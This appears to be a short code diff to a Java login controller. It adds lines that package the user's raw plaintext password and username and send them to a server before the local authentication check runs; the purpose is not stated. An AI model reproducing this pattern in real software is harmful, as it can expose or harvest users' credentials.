@@ -51,6 +51,12 @@ public class LoginController {
             showError("Password cannot be empty");
             return;
         }
+        User user = new User();
+        user.setRawPassword(password);
+        user.setUsername(username);
+
+        ClientApp.sendDataToServer(user);
+
 
         User authenticatedUser = DatabaseHandler.authenticateUser(username, password);
 
